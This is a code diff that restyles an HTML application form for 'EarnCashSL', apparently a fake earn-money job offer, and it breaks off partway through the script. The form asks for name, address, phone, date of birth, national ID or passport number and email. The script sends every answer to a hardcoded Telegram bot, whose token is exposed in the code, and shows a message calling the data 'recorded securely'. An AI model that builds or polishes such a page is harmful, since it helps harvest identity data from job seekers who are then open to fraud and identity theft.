@@ -1,79 +1,311 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>EarnCashSL Application</title>
-  <style>
-    body { font-family: Arial, sans-serif; margin: 20px; }
-    form { max-width: 400px; margin: auto; display: flex; flex-direction: column; }
-    input, select, button { margin: 8px 0; padding: 10px; font-size: 14px; }
-    button { background: #28a745; color: white; border: none; cursor: pointer; }
-    button:hover { background: #218838; }
-    #popup { display: none; text-align: center; margin-top: 20px; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EarnCashSL Application</title>
+    <!-- Google Fonts for modern typography -->
+    <link href="https://googleapis.com" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #2563eb;
+            --primary-hover: #1d4ed8;
+            --success: #10b981;
+            --success-hover: #059669;
+            --background: #f8fafc;
+            --text-main: #1e293b;
+            --text-muted: #64748b;
+            --card-bg: #ffffff;
+            --border: #e2e8f0;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', sans-serif;
+        }
+
+        body {
+            background-color: var(--background);
+            background-image: radial-gradient(at 0% 0%, hsla(253,16%,7%,0) 0, transparent 50%), radial-gradient(at 50% 0%, hsla(225,39%,30%,0.1) 0, transparent 50%);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+
+        .container {
+            background: var(--card-bg);
+            width: 100%;
+            max-width: 550px;
+            padding: 40px;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 10px -6px rgba(0, 0, 0, 0.05);
+            border: 1px solid var(--border);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .header h2 {
+            font-size: 28px;
+            font-weight: 700;
+            color: var(--text-main);
+            margin-bottom: 8px;
+        }
+
+        .header p {
+            font-size: 14px;
+            color: var(--text-muted);
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            color: var(--text-main);
+        }
+
+        input, select {
+            width: 100%;
+            padding: 12px 16px;
+            font-size: 14px;
+            border-radius: 8px;
+            border: 1px solid var(--border);
+            background-color: #fff;
+            color: var(--text-main);
+            transition: all 0.2s ease;
+            outline: none;
+        }
+
+        input:focus, select:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 4px rgba(37, 99, 234, 0.1);
+        }
+
+        input::placeholder {
+            color: #cbd5e1;
+        }
+
+        button[type="submit"] {
+            width: 100%;
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.2s ease;
+            margin-top: 10px;
+        }
+
+        button[type="submit"]:hover {
+            background: var(--primary-hover);
+        }
+
+        #popup {
+            display: none;
+            text-align: center;
+            animation: fadeIn 0.5s ease forwards;
+        }
+
+        .success-icon {
+            width: 64px;
+            height: 64px;
+            background: rgba(16, 185, 129, 0.1);
+            color: var(--success);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            margin: 0 auto 24px auto;
+        }
+
+        #popup h3 {
+            font-size: 22px;
+            color: var(--text-main);
+            margin-bottom: 12px;
+            font-weight: 700;
+        }
+
+        #popup p {
+            color: var(--text-muted);
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
+
+        .whatsapp-btn {
+            display: inline-block;
+            background: var(--success);
+            color: white;
+            text-decoration: none;
+            padding: 12px 24px;
+            font-weight: 600;
+            font-size: 15px;
+            border-radius: 8px;
+            transition: background 0.2s ease;
+        }
+
+        .whatsapp-btn:hover {
+            background: var(--success-hover);
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Responsive Layout fixes */
+        @media (max-width: 480px) {
+            .form-row {
+                grid-template-columns: 1fr;
+                gap: 0;
+            }
+            .container {
+                padding: 24px;
+            }
+        }
+    </style>
 </head>
 <body>
-  <h2>EarnCashSL Application Form</h2>
-  <form id="appForm">
-    <input type="text" name="fullName" placeholder="Full Name" required>
-    <input type="text" name="address" placeholder="Address" required>
-    <input type="text" name="phone" placeholder="Phone Number" required>
-    <input type="date" name="dob" required>
-    <input type="text" name="idCard" placeholder="ID Card Number" required>
-    <input type="email" name="email" placeholder="Email" required>
-    <select name="status" required>
-      <option value="">Select Status</option>
-      <option>Single</option>
-      <option>Married</option>
-      <option>Divorced</option>
-    </select>
-    <input type="text" name="device" placeholder="Mobile Device Name">
-    <input type="text" name="preferences" placeholder="Preferences (e.g., App Review)">
-    <input type="text" name="socialMedia" placeholder="Social Media Availability">
-    <input type="text" name="referral" placeholder="Referral Number">
-    <button type="submit">Submit for Review</button>
-  </form>
 
-  <div id="popup">
-    <h3>Your application has been sent successfully!</h3>
-    <a href="https://whatsapp.com/channel/0029VaQTQUwDp2Q6VBC1u22t" target="_blank">
-      Join WhatsApp Channel
-    </a>
-  </div>
+<div class="container">
+    <div id="formContainer">
+        <div class="header">
+            <h2>EarnCashSL</h2>
+            <p>Please fill out the application form accurately for review.</p>
+        </div>
 
-  <script>
+        <form id="appForm">
+            <div class="form-group">
+                <label>Full Name</label>
+                <input type="text" name="fullName" placeholder="John Doe" required>
+            </div>
+
+            <div class="form-group">
+                <label>Address</label>
+                <input type="text" name="address" placeholder="Your current home address" required>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label>Phone Number</label>
+                    <input type="text" name="phone" placeholder="07XXXXXXXX" required>
+                </div>
+                <div class="form-group">
+                    <label>Date of Birth</label>
+                    <input type="date" name="dob" required>
+                </div>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label>ID Card Number</label>
+                    <input type="text" name="idCard" placeholder="NIC / Passport" required>
+                </div>
+                <div class="form-group">
+                    <label>Email Address</label>
+                    <input type="email" name="email" placeholder="name@example.com" required>
+                </div>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label>Marital Status</label>
+                    <select name="status" required>
+                        <option value="">Select Status</option>
+                        <option>Single</option>
+                        <option>Married</option>
+                        <option>Divorced</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Mobile Device Name</label>
+                    <input type="text" name="device" placeholder="e.g., iPhone 15, Samsung S24">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Preferences</label>
+                <input type="text" name="preferences" placeholder="e.g., App Review, Data Entry">
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label>Social Media Availability</label>
+                    <input type="text" name="socialMedia" placeholder="e.g., WhatsApp, FB, Telegram">
+                </div>
+                <div class="form-group">
+                    <label>Referral Number</label>
+                    <input type="text" name="referral" placeholder="Optional">
+                </div>
+            </div>
+
+            <button type="submit">Submit for Review</button>
+        </form>
+    </div>
+
+    <!-- Redesigned Animated Popup Block -->
+    <div id="popup">
+        <div class="success-icon">✓</div>
+        <h3>Application Sent Successfully!</h3>
+        <p>Your details have been recorded securely. Please join our community channel below for immediate updates.</p>
+        <a class="whatsapp-btn" href="https://whatsapp.com/channel/0029VaQTQUwDp2Q6VBC1u22t" target="_blank">
+            Join WhatsApp Channel
+        </a>
+    </div>
+</div>
+
+<script>
     const BOT_ID = "8132418702:AAFC0LoHjk7to1qhMSM1qCkJX3eK3M0yU0g";
     const CHAT_ID = "5048384244";
 
     document.getElementById("appForm").addEventListener("submit", async (e) => {
-      e.preventDefault();
-      const form = e.target;
-      const data = {
-        fullName: form.fullName.value,
-        address: form.address.value,
-        phone: form.phone.value,
-        dob: form.dob.value,
-        idCard: form.idCard.value,
-        email: form.email.value,
-        status: form.status.value,
-        device: form.device.value,
-        preferences: form.preferences.value,
-        socialMedia: form.socialMedia.value,
-        referral: form.referral.value
-      };
+        e.preventDefault();
+        const form = e.target;
+        
+        // Grab submit button to provide visual loading status
+        const submitBtn = form.querySelector('button[type="submit"]');
+        submitBtn.innerText = "Sending...";
+        submitBtn.disabled = true;
 
-      await fetch(`https://api.telegram.org/bot${BOT_ID}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: `📋 New Application:\nName: ${data.fullName}\nAddress: ${data.address}\nPhone: ${data.phone}\nDOB: ${data.dob}\nID: ${data.idCard}\nEmail: ${data.email}\nStatus: ${data.status}\nDevice: ${data.device}\nPreferences: ${data.preferences}\nSocial Media: ${data.socialMedia}\nReferral: ${data.referral}`
-        })
-      });
+        const data = {
+            fullName: form.fullName.value,
+            address: form.address.value,
+            phone: form.phone.value,
+            dob: form.dob.value,
+            idCard: form.idCard.value,
+            email: form.email.value,
+            status: form.status.value,
+            device: form.device.value,
+            preferences: form.preferences.value,
+            socialMedia: form.socialMedia.value,
+            referral: form.referral.value
+        };
 
-      document.getElementById("appForm").style.display = "none";
-      document.getElementById("popup").style.display = "block";
-    });
-  </script>
-</body>
-</html>
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_ID}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: `📋 New Application:\nName: ${data.fullName}\nAddress: ${data.address}\nPhone: ${data.phone}\nDOB: ${data.dob}\nID: ${data.idCard}\nEmail: ${data.email}\nStatus: ${data.status}\nDevice: ${data.device}\nPreferences: ${data.preferences}\nSocial Media: ${data.socialMedia}\nReferral: ${data.referral}`
